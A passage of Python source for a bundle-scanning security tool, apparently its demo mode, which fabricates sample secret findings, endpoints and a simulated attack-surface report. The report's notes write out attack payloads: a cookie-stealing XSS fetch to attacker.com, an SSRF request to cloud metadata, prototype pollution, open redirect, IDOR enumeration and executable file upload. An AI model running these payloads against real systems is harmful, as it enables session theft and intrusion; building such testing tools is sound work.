            matched_value="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.",
            redacted_value="eyJhbGci...none...",
            sha256="abc003",
            context="const devToken = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...'",
            description="JWT using alg:none — signature verification is disabled. Token decodes to {sub: '1234567890', role: 'admin'}.",
            impact="If the server accepts alg:none tokens, any user can forge an admin JWT and bypass authentication entirely.",
            remediation="Remove hardcoded tokens. Enforce a strong algorithm (RS256 or ES256) server-side. Reject any token with alg:none.",
            false_positive_notes="", confidence_label="likely_secret",
            occurrences=["src/utils/jwt.js:47"],
        ),
        # HIGH — Stripe secret key
        Finding(
            id="demo004", rule_id="STRIPE_SECRET_KEY", title="Stripe Secret Key",
            category="Stripe", severity="HIGH", confidence=0.96,
            file_url="sourcemap://src/api/client.js", source_page=main_js.source_page,
            line_number=8, column=18,
            matched_value="sk_live_51Hb3XYZabc123fake0SECRET",
            redacted_value="sk_live_51Hb3...CRET",
            sha256="abc004",
            context="const stripe = Stripe('sk_live_51Hb3XYZ...')",
            description="Stripe live secret key in client-side bundle. This is a server-only key — never expose it in frontend code.",
            impact="Attacker can create charges, issue refunds, read all payment data, and exfiltrate customer card metadata.",
            remediation="Delete this key in Stripe dashboard. Use publishable key (pk_live_) client-side only. Move all charge logic server-side.",
            false_positive_notes="", confidence_label="likely_secret",
            occurrences=["src/api/client.js:8"],
        ),
        # HIGH — hardcoded JWT (valid signed token)
        Finding(
            id="demo005", rule_id="JWT_TOKEN", title="JSON Web Token (hardcoded)",
            category="JWT", severity="HIGH", confidence=0.91,
            file_url=main_js.url, source_page=main_js.source_page,
            line_number=1882, column=22,
            matched_value="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzI3NTQ4ODAwfQ.SIG",
            redacted_value="eyJhbGci...HS256...SIG",
            sha256="abc005",
            context="const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'",
            description="Hardcoded HS256 JWT decodes to {role: 'admin', iat: 1727548800}. Issued 2026-09-28.",
            impact="May be a valid session token. Grants admin-level access if not yet expired.",
            remediation="Remove hardcoded tokens. Use runtime authentication flows only.",
            false_positive_notes="", confidence_label="likely_secret",
            occurrences=["main.8f31ab.chunk.js:1882"],
        ),
        # MEDIUM — Sentry DSN
        Finding(
            id="demo006", rule_id="SENTRY_DSN", title="Sentry DSN",
            category="Sentry", severity="MEDIUM", confidence=0.88,
            file_url=main_js.url, source_page=main_js.source_page,
            line_number=204, column=6,
            matched_value="https://abcdef1234567890abcdef1234567890@o123456.ingest.sentry.io/1234567",
            redacted_value="https://abcdef...@o123456.ingest.sentry.io/...",
            sha256="abc006",
            context="Sentry.init({ dsn: 'https://abcdef...' })",
            description="Sentry DSN exposed. Low severity in isolation but reveals org ID and project ID.",
            impact="Attacker can submit fake error events, pollute error tracking, or enumerate project config.",
            remediation="Sentry DSNs are semi-public but should be rate-limited. Enable ingest rate limiting and project-level IP allowlisting.",
            false_positive_notes="", confidence_label="likely_secret",
            occurrences=["main.8f31ab.chunk.js:204"],
        ),
        # FP
        Finding(
            id="demo007", rule_id="GENERIC_API_KEY", title="Generic API Key",
            category="Generic", severity="MEDIUM", confidence=0.52,
            file_url=main_js.url, source_page=main_js.source_page,
            line_number=3441, column=4,
            matched_value="api_key_placeholder_do_not_use",
            redacted_value="api_key_plac...use",
            sha256="abc007",
            context="const config = { api_key: 'placeholder' }",
            description="Generic API key pattern — value contains placeholder indicator.",
            impact="", remediation="Move real keys to environment variables.",
            false_positive_notes="Value contains 'placeholder' — likely a config template, not a real key.",
            confidence_label="likely_false_positive",
            occurrences=["main.8f31ab.chunk.js:3441"],
        ),
    ]

    # ── Endpoints ──────────────────────────────────────────────────────────────
    def _ep(url, method, cat, line, conf=0.88, auth="", src=None):
        return Endpoint(
            url=url, path=url, method=method, category=cat,
            source_file=src or main_js.url, line_number=line, confidence=conf,
            auth_context=auth,
        )

    fake_endpoints = [
        # Auth
        _ep("/api/auth/login",           "POST", "AUTH",    623, 0.95),
        _ep("/api/auth/logout",          "POST", "AUTH",    641, 0.93),
        _ep("/api/auth/refresh",         "POST", "AUTH",    659, 0.91),
        _ep("/api/auth/password/reset",  "POST", "AUTH",    672, 0.87),
        _ep("/api/auth/mfa/verify",      "POST", "AUTH",    689, 0.85),
        # Admin
        _ep("/admin/dashboard",          "GET",  "ADMIN",   891, 0.90),
        _ep("/admin/users",              "GET",  "ADMIN",   908, 0.88, "admin_required"),
        _ep("/admin/users/:id",          "DELETE","ADMIN",  924, 0.85, "admin_required"),
        _ep("/admin/config",             "POST", "ADMIN",   937, 0.83, "admin_required"),
        _ep("/admin/audit-log",          "GET",  "ADMIN",   952, 0.82, "admin_required"),
        # GraphQL
        _ep("/graphql",                  "POST", "GRAPHQL", 1024, 0.97),
        # API
        _ep("/api/v1/users",             "GET",  "API",     512,  0.90, "auth_required"),
        _ep("/api/v1/users/:id",         "GET",  "API",     528,  0.88, "auth_required"),
        _ep("/api/v1/users/:id",         "PUT",  "API",     545,  0.86, "auth_required"),
        _ep("/api/v1/users/:id/avatar",  "POST", "API",     561,  0.83, "auth_required"),
        _ep("/api/v1/config",            "GET",  "API",     1201, 0.79),
        _ep("/api/v1/reports",           "GET",  "API",     1218, 0.84, "auth_required"),
        _ep("/api/v1/reports/:id",       "GET",  "API",     1234, 0.82, "auth_required"),
        _ep("/api/v1/reports/export",    "POST", "API",     1251, 0.80, "auth_required"),
        _ep("/api/v1/payments",          "POST", "API",     1389, 0.87, "auth_required"),
        _ep("/api/v1/payments/:id",      "GET",  "API",     1406, 0.85, "auth_required"),
        _ep("/api/v2/search",            "GET",  "API",     1522, 0.81),
        _ep("/api/v2/upload",            "POST", "API",     1539, 0.88, "auth_required"),
        _ep("/api/v2/export",            "GET",  "API",     1557, 0.79, "auth_required"),
        _ep("/api/internal/health",      "GET",  "API",     1603, 0.76),
        _ep("/api/internal/metrics",     "GET",  "API",     1618, 0.74),
        # Routes
        _ep("/dashboard",                "GET",  "ROUTE",   2014, 0.99),
        _ep("/profile",                  "GET",  "ROUTE",   2021, 0.99),
        _ep("/settings",                 "GET",  "ROUTE",   2031, 0.98),
        _ep("/reports",                  "GET",  "ROUTE",   2041, 0.97),
        _ep("/admin",                    "GET",  "ROUTE",   2051, 0.97, "admin_required"),
    ]

    # ── Infrastructure ─────────────────────────────────────────────────────────
    fake_infra = [
        InfrastructureItem(
            value="192.168.1.50", classification="PRIVATE_IP",
            source_file=main_js.url, line_number=912, confidence=0.92, action="report_only",
        ),
        InfrastructureItem(
            value="10.0.0.24", classification="PRIVATE_IP",
            source_file="sourcemap://src/api/client.js", line_number=3, confidence=0.91, action="report_only",
        ),
        InfrastructureItem(
            value="s3.amazonaws.com/example-prod-assets", classification="CLOUD_STORAGE",
            source_file=main_js.url, line_number=2204, confidence=0.89, action="report_only",
        ),
        InfrastructureItem(
            value="example.us-east-1.rds.amazonaws.com", classification="DATABASE_HOST",
            source_file="sourcemap://src/config/aws.js", line_number=22, confidence=0.85, action="report_only",
        ),
    ]

    # ── Build ScanResult ───────────────────────────────────────────────────────
    started  = datetime.utcnow() - timedelta(seconds=14)
    finished = datetime.utcnow()
    result   = ScanResult(
        target_url="https://demo.example.com",
        started_at=started, finished_at=finished,
        pages_crawled=87, js_files=fake_js_files,
        findings=fake_findings, endpoints=fake_endpoints,
        infrastructure=fake_infra, errors=[],
    )

    # ── Attack surface mapping (simulated) ────────────────────────────────────
    # Build a fake SurfaceReport so the attack testing section renders fully
    try:
        from .testing.models import (
            SurfaceReport, SurfaceResult, SurfaceSummary,
            SurfaceStatus, ConfidenceLevel, AttackCategory,
        )
        _cors_ep   = next(e for e in fake_endpoints if "/api/v1/users" == e.url and e.method == "GET")
        _idor_ep   = next(e for e in fake_endpoints if "/api/v1/users/:id" == e.url and e.method == "GET")
        _proto_ep  = next(e for e in fake_endpoints if "/api/v2/search" == e.url)
        _xss_ep    = next(e for e in fake_endpoints if "/api/v2/search" == e.url)
        _admin_ep  = next(e for e in fake_endpoints if "/admin/users" == e.url)
        _upload_ep = next(e for e in fake_endpoints if "/api/v2/upload" == e.url)
        _gql_ep    = next(e for e in fake_endpoints if "/graphql" == e.url)
        _ssrf_ep   = next(e for e in fake_endpoints if "/api/v1/reports/export" == e.url)

        attack_report = SurfaceReport(
            target_url="https://demo.example.com",
            started_at=started, finished_at=finished,
        )

        # CORS — wildcard origin reflection
        attack_report.results.append(SurfaceResult(
            endpoint_url  = "https://demo.example.com/api/v1/users",
            method        = "GET",
            category      = AttackCategory.CORS,
            surface_type  = "Wildcard CORS",
            parameters    = ["Origin"],
            auth_context  = "auth_required",
            confidence    = ConfidenceLevel.HIGH,
            evidence      = [
                "API client sets: axios.defaults.headers['Origin'] = window.location.origin",
                "No CORS validation logic found in JS — server likely reflects any Origin",
                "withCredentials: true present on all API calls",
            ],
            provenance_source = "static",
            burp_notes    = (
                "Send: GET /api/v1/users  Origin: https://evil.com\n"
                "Check response for: Access-Control-Allow-Origin: https://evil.com\n"
                "                    Access-Control-Allow-Credentials: true\n"
                "If both present: CORS misconfiguration confirmed — arbitrary origin bypass."
            ),
            status        = SurfaceStatus.CANDIDATE,
        ))

        # CORS — admin subdomain trust
        attack_report.results.append(SurfaceResult(
            endpoint_url  = "https://demo.example.com/admin/users",
            method        = "GET",
            category      = AttackCategory.CORS,
            surface_type  = "Subdomain CORS Trust",
            parameters    = ["Origin"],
            auth_context  = "admin_required",
            confidence    = ConfidenceLevel.HIGH,
            evidence      = [
                "Hardcoded origin check: allowedOrigins.includes('admin.example.com')",
                "Subdomain admin.example.com discovered in JS — if attacker controls it, CORS bypass works",
            ],
            provenance_source = "static",
            burp_notes    = (
                "Send: GET /admin/users  Origin: https://admin.example.com\n"
                "If admin.example.com is takeable (dangling DNS), full CORS bypass to admin endpoints."
            ),
            status        = SurfaceStatus.CANDIDATE,
        ))

        # IDOR — users by ID
        attack_report.results.append(SurfaceResult(
            endpoint_url  = "https://demo.example.com/api/v1/users/:id",
            method        = "GET",
            category      = AttackCategory.ACCESS_CONTROL,
            surface_type  = "IDOR",
            parameters    = ["id"],
            auth_context  = "auth_required",
            confidence    = ConfidenceLevel.HIGH,
            evidence      = [
                "Path param :id is a plain integer (e.g. /api/v1/users/1042)",
                "No ownership check in JS — UI fetches other users' profiles by ID",
                "Endpoint returns full user object including email, phone, role",
            ],
            provenance_source = "static",
            burp_notes    = (
                "GET /api/v1/users/1001  (your own)\n"
                "GET /api/v1/users/1002  (another user)\n"
                "Compare response bodies — IDOR confirmed if different user's data returns with HTTP 200."
            ),
            status        = SurfaceStatus.CANDIDATE,
        ))

        # IDOR — reports by ID
        attack_report.results.append(SurfaceResult(
            endpoint_url  = "https://demo.example.com/api/v1/reports/:id",
            method        = "GET",
            category      = AttackCategory.ACCESS_CONTROL,
            surface_type  = "IDOR",
            parameters    = ["id"],
            auth_context  = "auth_required",
            confidence    = ConfidenceLevel.MEDIUM,
            evidence      = [
                "Report fetch: fetchReport(reportId) — no tenant or owner scoping visible",
                "Report IDs appear sequential in pagination code (pageSize=20, startFrom=id)",
            ],
            provenance_source = "static",
            burp_notes    = (
                "GET /api/v1/reports/1  through /api/v1/reports/500 (iterate)\n"
                "Flag any 200 that returns another org's data."
            ),
            status        = SurfaceStatus.CANDIDATE,
        ))

        # Prototype pollution
        attack_report.results.append(SurfaceResult(
            endpoint_url  = "https://demo.example.com/api/v2/search",
            method        = "GET",
            category      = AttackCategory.PROTOTYPE_POLLUTION,
            surface_type  = "Prototype Pollution via query merge",
            parameters    = ["q", "filter", "sort"],
            auth_context  = "",
            confidence    = ConfidenceLevel.HIGH,
            evidence      = [
                "Deep merge: Object.assign(target, JSON.parse(userInput)) without __proto__ sanitization",
                "Search params passed directly into config object used across components",
                "lodash.merge 4.6.1 detected (CVE-2019-10744 — prototype pollution)",
            ],
            provenance_source = "static",
            burp_notes    = (
                'GET /api/v2/search?q=test&__proto__[isAdmin]=true\n'
                'or POST body: {"__proto__": {"isAdmin": true}}\n'
                "Check if isAdmin becomes true on subsequent requests — global prototype poisoned."
            ),
            status        = SurfaceStatus.CANDIDATE,
        ))

        # XSS — search reflection
        attack_report.results.append(SurfaceResult(
            endpoint_url  = "https://demo.example.com/api/v2/search",
            method        = "GET",
            category      = AttackCategory.XSS,
            surface_type  = "Reflected XSS",
            parameters    = ["q"],
            auth_context  = "",
            confidence    = ConfidenceLevel.HIGH,
            evidence      = [
                "dangerouslySetInnerHTML={{ __html: searchQuery }} found in SearchResults.jsx",
                "searchQuery taken directly from URL param ?q= with no sanitization",
                "No DOMPurify or escaping wrapper detected",
            ],
            provenance_source = "static",
            burp_notes    = (
                "GET /api/v2/search?q=<img src=x onerror=alert(1)>\n"
                "Check if HTML renders in response or in React component output.\n"
                "Try: ?q=<script>fetch('https://attacker.com/?c='+document.cookie)</script>"
            ),
            status        = SurfaceStatus.CANDIDATE,
        ))

        # SSRF — export URL parameter
        attack_report.results.append(SurfaceResult(
            endpoint_url  = "https://demo.example.com/api/v1/reports/export",
            method        = "POST",
            category      = AttackCategory.SSRF,
            surface_type  = "SSRF via user-controlled URL",
            parameters    = ["url", "format"],
            auth_context  = "auth_required",
            confidence    = ConfidenceLevel.MEDIUM,
            evidence      = [
                "Export handler: fetch(payload.url, { method: 'GET' }) — url is caller-supplied",
                "Used to pull external report templates: exportReport({ url: templateUrl })",
                "No URL allowlist or scheme validation visible",
            ],
            provenance_source = "static",
            burp_notes    = (
                'POST /api/v1/reports/export\n'
                'Body: {"url": "http://169.254.169.254/latest/meta-data/", "format": "pdf"}\n'
                "Check response body for AWS metadata content — SSRF confirmed."
            ),
            status        = SurfaceStatus.CANDIDATE,
        ))

        # Open redirect
        attack_report.results.append(SurfaceResult(
            endpoint_url  = "https://demo.example.com/api/auth/login",
            method        = "POST",
            category      = AttackCategory.OPEN_REDIRECT,
            surface_type  = "Open Redirect via next param",
            parameters    = ["next", "redirect_uri"],
            auth_context  = "",
            confidence    = ConfidenceLevel.HIGH,
            evidence      = [
                "Post-login: window.location.href = params.get('next') || '/'",
                "No origin validation — accepts fully-qualified external URLs",
                "Used in magic-link emails: /login?next=/dashboard  (but not validated)",
            ],
            provenance_source = "static",
            burp_notes    = (
                "POST /api/auth/login  Body: {user, pass}\n"
                "With: ?next=https://evil.com\n"
                "After login, server should redirect to /dashboard — if it redirects to evil.com: confirmed."
            ),
            status        = SurfaceStatus.CANDIDATE,
        ))

        # GraphQL introspection
        attack_report.results.append(SurfaceResult(
            endpoint_url  = "https://demo.example.com/graphql",
            method        = "POST",
            category      = AttackCategory.CONFIGURATION,
            surface_type  = "GraphQL Introspection Enabled",
            parameters    = ["query"],
            auth_context  = "",
            confidence    = ConfidenceLevel.HIGH,
            evidence      = [
                "Introspection query hardcoded in admin panel JS: {__schema{types{name}}}",
                "No disableIntrospection flag visible in Apollo Server config",
                "Queries found: getUser, listUsers, deleteUser, updateRole, createAPIKey",
            ],
            provenance_source = "static",
            burp_notes    = (
                'POST /graphql  Body: {"query": "{__schema{types{name fields{name}}}}"}\n'
                "Dump full schema — look for mutations without auth checks (createAPIKey, deleteUser)."
            ),
            status        = SurfaceStatus.CANDIDATE,
        ))

        # File upload abuse
        attack_report.results.append(SurfaceResult(
            endpoint_url  = "https://demo.example.com/api/v2/upload",
            method        = "POST",
            category      = AttackCategory.CONFIGURATION,
            surface_type  = "Unrestricted File Upload",
            parameters    = ["file", "type"],
            auth_context  = "auth_required",
            confidence    = ConfidenceLevel.MEDIUM,
            evidence      = [
                "Accept attribute: accept='*/*' — no client-side type restriction",
                "MIME type passed through from client: Content-Type header forwarded as-is",
                "No server-side magic-byte validation visible in JS",
            ],
            provenance_source = "static",
            burp_notes    = (
                "Upload a .php or .aspx file with Content-Type: image/jpeg\n"
                "Check response for stored path — attempt to execute uploaded file via direct URL."
            ),
            status        = SurfaceStatus.CANDIDATE,
        ))

        # Populate summaries
        from collections import defaultdict
        cat_groups = defaultdict(list)
        for r in attack_report.results:
            cat_groups[r.category].append(r)
        for cat, results in cat_groups.items():
            mapped = sum(1 for r in results if r.status in (SurfaceStatus.CANDIDATE, SurfaceStatus.MAPPED))
            attack_report.summaries.append(SurfaceSummary(
                category=cat, total_candidates=len(results), mapped=mapped,
            ))
        attack_report.total_candidates = len(attack_report.results)
        attack_report.total_mapped     = attack_report.total_candidates

        fake_attack_report = attack_report
    except Exception:
        fake_attack_report = None

    # ── Build attack surface graph from demo data ──────────────────────────────
    try:
        from .storage.graph import AttackSurfaceGraph
        result.graph = AttackSurfaceGraph.from_scan_result(result)
    except Exception:
        pass

    # ── Shared extras / subdomains ─────────────────────────────────────────────
    demo_extras = {
        "login_result": {
            "success": True, "method": "form_submit",
            "login_url": "https://demo.example.com/login",
            "final_url": "https://demo.example.com/dashboard",
            "cookies": [
                {"name": "session",    "value": "eyJhbGci..."},
                {"name": "csrf_token", "value": "8f3a2b..."},
            ],
            "cookie_string": "session=eyJhbGci...; csrf_token=8f3a2b...",
            "token_keys": ["access_token", "refresh_token"],
            "steps": [
                "navigate to /login",
                "fill #email → demo@example.com",
                "fill #password → [redacted]",
                "submit form",
                "MFA bypassed — OTP field not required in demo env",
                "redirected to /dashboard — session active",
            ],
            "error_message": "",
        },
        "headless_stats": {
            "pages": 34, "js": 7, "xhr": 142, "fetch": 58,
            "ws": 3, "routes": 18, "endpoints": 31, "workers": 2,
            "timings": {"total_ms": 9412, "pages_ms": 7840, "analysis_ms": 1572},
        },
        "source_map_details": {
            "discovered": 7, "valid": 7, "recovered": 7, "sources": 47,
            "items": [
                {"js": "main.8f31ab.chunk.js",         "map": "main.8f31ab.chunk.js.map",         "sources": 12},
                {"js": "vendors~main.a3c9f1.chunk.js", "map": "vendors~main.a3c9f1.chunk.js.map", "sources": 28},
                {"js": "auth.b2a17f.chunk.js",         "map": "auth.b2a17f.chunk.js.map",         "sources": 4},
                {"js": "admin.d4c881.chunk.js",        "map": "admin.d4c881.chunk.js.map",        "sources": 3},
            ],
        },
        "chunk_stats": {
            "runtime": True, "discovered": 12, "downloaded": 12,
            "endpoints": 23, "findings": 3,
        },
        "passive_stats": {
            "source": "Wayback Machine + CommonCrawl",
            "urls": 318, "js": 41, "unique": 38, "new": 9,
        },
        "lib_findings": [
            LibraryFinding(
                library="lodash", version="4.6.1", cve_id="CVE-2019-10744",
                severity="HIGH", cvss=7.4,
                description="Prototype pollution via merge() — attacker can overwrite Object.prototype",
                remediation="Upgrade to lodash >= 4.17.21",
                source_file=fake_js_files[1].url, confidence=0.97,
            ),
            LibraryFinding(
                library="moment", version="2.24.0", cve_id="CVE-2022-24785",
                severity="MEDIUM", cvss=5.3,
                description="Path traversal in locale loading — arbitrary file read on server",
                remediation="Upgrade to moment >= 2.29.2",
                source_file=fake_js_files[1].url, confidence=0.93,
            ),
            LibraryFinding(
                library="axios", version="0.19.2", cve_id="CVE-2020-28168",
                severity="MEDIUM", cvss=5.9,
                description="SSRF via follow redirects — crafted URL bypasses same-origin check",
                remediation="Upgrade to axios >= 0.21.1",
                source_file=fake_js_files[0].url, confidence=0.95,
            ),
            LibraryFinding(
                library="jquery", version="3.4.1", cve_id="CVE-2020-11022",
                severity="MEDIUM", cvss=6.1,
                description="XSS via passing HTML from untrusted sources to manipulation methods",
                remediation="Upgrade to jQuery >= 3.5.0",
                source_file=fake_js_files[1].url, confidence=0.91,
            ),
            LibraryFinding(
                library="serialize-javascript", version="2.1.1", cve_id="CVE-2020-7660",
                severity="HIGH", cvss=8.1,
                description="RCE risk — regex in serialized functions not escaped; XSS if output rendered",
                remediation="Upgrade to serialize-javascript >= 3.1.0",
                source_file=fake_js_files[0].url, confidence=0.89,
            ),
        ],
        "attack_report": fake_attack_report,
    }
    demo_subdomains = [
        "api.example.com", "staging.example.com", "admin.example.com",
        "dev.example.com",  "cdn.example.com",     "auth.example.com",
    ]

    # ── Determine formats ──────────────────────────────────────────────────────
    _fmt_str = getattr(args, "format", "terminal") if args else "terminal"
    formats  = [f.strip() for f in _fmt_str.split(",")]
    _output  = getattr(args, "output",      "")              if args else ""
    _rname   = getattr(args, "report_name", "bundlespy-demo") if args else "bundlespy-demo"
    _no_color = getattr(args, "no_color",   False)            if args else False

    if _no_color:
        os.environ["NO_COLOR"] = "1"

    # ── Terminal output ────────────────────────────────────────────────────────
    if "terminal" in formats:
        print_header(
            "https://demo.example.com",
            mode="Headless + Stealth + Auto-Login",
            scope="Strict",
            version=PROJECT_VERSION,
            author=AUTHOR_NAME,
        )
        print_report(
            result,
            verbose=True,
            extras=demo_extras,
            subdomains=demo_subdomains,
        )
        if fake_attack_report is not None:
            try:
                from .testing.reporter import print_surface_report
                print_surface_report(fake_attack_report)
            except Exception:
                pass

    # ── File reports ───────────────────────────────────────────────────────────
    file_formats = [f for f in formats if f != "terminal"]
    if file_formats:
        file_paths = _write_reports(
            result,
            file_formats,
            _output,
            started,
            report_name = _rname,
            extras      = demo_extras,
            subdomains  = demo_subdomains,
        )
        for fmt, path in file_paths.items():
            print(f"  {fmt:<12} {path}")

    return 0


def main() -> None:
    parser = build_parser()

    # If the first arg looks like a URL or flag, inject "scan" so
    # `bundlespy https://target.com` works without typing "scan"
    argv = sys.argv[1:]
    if argv and argv[0] not in ("scan", "local", "demo", "-h", "--help"):
        argv = ["scan"] + argv

    args = parser.parse_args(argv)

    if args.command == "scan":
        sys.exit(run_scan(args))
    elif args.command == "local":
        sys.exit(run_local(args))
    elif args.command == "demo":
        sys.exit(run_demo(args))
    else:
        parser.print_help()
        sys.exit(0)


if __name__ == "__main__":
    main()
